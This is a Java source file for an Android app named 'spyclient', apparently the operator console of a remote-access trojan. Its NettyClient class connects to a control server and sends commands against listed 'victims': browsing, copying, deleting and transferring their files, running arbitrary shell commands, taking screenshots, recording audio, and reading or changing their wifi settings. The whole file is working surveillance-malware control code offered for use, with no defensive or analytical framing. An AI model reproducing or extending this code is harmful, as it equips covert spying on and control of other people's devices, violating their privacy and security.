package slade.carter.spyclient;

import android.os.AsyncTask;
import android.util.Log;

import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

import java.net.SocketAddress;

import io.netty.bootstrap.Bootstrap;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import slade.carter.spyclient.decoders.ResponseDecoder;
import slade.carter.spyclient.encoders.RequestEncoder;

public class NettyClient extends AsyncTask<String, String, String> {
    private static NettyClient nettyClient;
    private QueryHandler queryHandler;

    private final String CONNECT_WAIT = "connectWait";
    private final String CONNECT_SUCCESS = "connectSuccess";
    private final String CONNECT_ERROR = "connectError";
    private final String SERVER_OFFLINE = "serverOffline";

    public NettyClient() {
        nettyClient = this;
    }

    public void sendAuthUser(String login, String password) {
        JSONObject query = new JSONObject();
        query.put("action", "auth.user");
        query.put("login", login);
        query.put("password", password);
        queryHandler.sendMessage(query);
    }

    public void sendGetVictims() {
        JSONObject query = new JSONObject();
        query.put("action", "get.victims");
        queryHandler.sendMessage(query);
    }

    public void sendGetFiles(String victim, String path) {
        JSONObject query = new JSONObject();
        query.put("action", "get.files");
        query.put("victim", victim);
        query.put("path", path);
        queryHandler.sendMessage(query);
    }

    public void sendDeleteFile(String victim, String path) {
        JSONObject query = new JSONObject();
        query.put("action", "delete.file");
        query.put("victim", victim);
        query.put("path", path);
        queryHandler.sendMessage(query);
    }

    public void sendRenameFile(String victim, String path, String newPath) {
        JSONObject query = new JSONObject();
        query.put("action", "rename.file");
        query.put("victim", victim);
        query.put("path", path);
        query.put("newPath", newPath);
        queryHandler.sendMessage(query);
    }

    public void sendMakeDir(String victim, String path) {
        JSONObject query = new JSONObject();
        query.put("action", "make.dir");
        query.put("victim", victim);
        query.put("path", path);
        queryHandler.sendMessage(query);
    }

    public void sendGetFileInfo(String victim, String path) {
        JSONObject query = new JSONObject();
        query.put("action", "get.file.info");
        query.put("victim", victim);
        query.put("path", path);
        queryHandler.sendMessage(query);
    }

    public void sendCopyFile(String victim, String path, String newPath) {
        JSONObject query = new JSONObject();
        query.put("action", "copy.file");
        query.put("victim", victim);
        query.put("path", path);
        query.put("newPath", newPath);
        queryHandler.sendMessage(query);
    }

    public void sendSetVictimName(String victim, String newName) {
        JSONObject query = new JSONObject();
        query.put("action", "set.victim.name");
        query.put("victim", victim);
        query.put("path", newName);
        queryHandler.sendMessage(query);
    }

    public void sendSetLoginIps(String victim, JSONArray ips) {
        JSONObject query = new JSONObject();
        query.put("action", "set.login.ips");
        query.put("victim", victim);
        query.put("ips", ips);
        queryHandler.sendMessage(query);
    }

    public void sendStartDownloadFile(String victim, String path, String downloadPath) {
        JSONObject query = new JSONObject();
        query.put("action", "start.download.file");
        query.put("victim", victim);
        query.put("path", path);
        query.put("downloadPath", downloadPath);
        queryHandler.sendMessage(query);
    }

    public void sendStartUploadFile(String victim, String path, String downloadPath) {
        JSONObject query = new JSONObject();
        query.put("action", "start.upload.file");
        query.put("victim", victim);
        query.put("path", path);
        query.put("downloadPath", downloadPath);
        queryHandler.sendMessage(query);
    }

    public void sendCmd(String victim, String command) {
        JSONObject query = new JSONObject();
        query.put("action", "cmd");
        query.put("victim", victim);
        query.put("command", command);
        queryHandler.sendMessage(query);
    }

    public void sendTakeScreen(String victim, String path) {
        JSONObject query = new JSONObject();
        query.put("action", "take.screen");
        query.put("victim", victim);
        query.put("path", path);
        queryHandler.sendMessage(query);
    }

    public void sendStartAudioRecord(String victim, Long seconds) {
        JSONObject query = new JSONObject();
        query.put("action", "start.audio.record");
        query.put("seconds", seconds);
        query.put("victim", victim);
        queryHandler.sendMessage(query);
    }

    public void sendGetVictimInfo(String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "get.victim.info");
        query.put("victim", victim);
        queryHandler.sendMessage(query);
    }

    public void sendGetLastOnline(String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "get.last.online");
        query.put("victim", victim);
        queryHandler.sendMessage(query);
    }

    public void sendGetWifiList(String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "get.wifi.list");
        query.put("victim", victim);
        queryHandler.sendMessage(query);
    }

    public void sendWifiConnect(String ssid, String password, String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "wifi.connect");
        query.put("ssid", ssid);
        query.put("password", password);
        query.put("victim", victim);
        queryHandler.sendMessage(query);
    }

    public void sendSetWifiEnabled(boolean enabled, String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "set.wifi.enabled");
        query.put("enabled", enabled);
        query.put("victim", victim);
        queryHandler.sendMessage(query);
    }

    public void sendErrorCode(String code) {
        JSONObject query = new JSONObject();
        query.put("errorCode", code);
        queryHandler.sendMessage(query);
    }

    public static NettyClient getInstance() {
        if (nettyClient == null) nettyClient = new NettyClient();
        return nettyClient;
    }

    @Override
    protected String doInBackground(String... strings) {
        EventLoopGroup workerGroup = null;
        try {
            //publishProgress(CONNECT_WAIT);
            workerGroup = new NioEventLoopGroup();
            Bootstrap bootstrap = new Bootstrap();
            bootstrap.group(workerGroup);
            bootstrap.channel(NioSocketChannel.class);
            bootstrap.option(ChannelOption.SO_KEEPALIVE, true);
            bootstrap.handler(new ChannelInitializer<SocketChannel>() {

                @Override
                public void initChannel(SocketChannel ch) {
                    queryHandler = new QueryHandler();
                    ch.pipeline().addLast(
                            new RequestEncoder(),
                            new ResponseDecoder(),
                            queryHandler);
                }
            });

            ChannelFuture f = bootstrap.connect(Config.IP_ADDRESS, Config.SERVER_PORT).sync();
            // publishProgress(CONNECT_SUCCESS);
            f.channel().closeFuture().sync();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            workerGroup.shutdownGracefully();
            try {
                int mills = 5000;
                //publishProgress(CONNECT_ERROR);
                Thread.sleep(mills);
            } catch (InterruptedException e1) {
                e1.printStackTrace();
            }
            //newConnection();
        }
        return null;
    }


    @Override
    protected void onProgressUpdate(String... values) {
        JSONParser parser = new JSONParser();
        try {
            MainActivity.getInstance().receiveMessage((JSONObject)parser.parse(values[0]));
        } catch (ParseException e) {
            e.printStackTrace();
            System.out.println("Данный с сервера не формата JSON!");
        }
    }

    public void receiveMessage(Object msg) {
        publishProgress(msg.toString());
    }
}